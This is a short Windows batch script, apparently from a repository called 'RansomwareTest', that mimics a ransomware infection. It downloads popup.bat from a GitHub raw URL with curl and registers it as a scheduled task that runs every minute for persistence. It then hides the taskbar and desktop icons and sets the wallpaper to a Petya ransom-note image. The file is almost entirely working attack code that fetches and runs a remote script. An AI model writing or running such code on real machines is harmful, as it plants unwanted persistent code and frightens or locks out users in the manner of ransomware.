set "TaskName=PopupTask"
set "url=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
set "ScriptPath=C:\temp\popup.bat"

:: Block user input
:: powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{F24}')"

:: persistence
curl -L -o "%ScriptPath%" "%url%"
timeout 3
pause

:: schtask for popup.bat
schtasks /Create /TN "%TaskName%" /TR "%ScriptPath%" /SC MINUTE /MO 1 /RL LIMITED /F
schtasks /Run /TN %TaskName%

:: Hide taskbar
powershell -WindowStyle Hidden -Command "&{$p = (New-Object -ComObject Shell.Application).Windows() | Where-Object {$_.Name -eq 'Taskbar'}; $p.Visible = 0}"
pause

:: Change wallpaper
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\temp\petya-ransom-note.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
pause

:: Hide desktop icons
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe
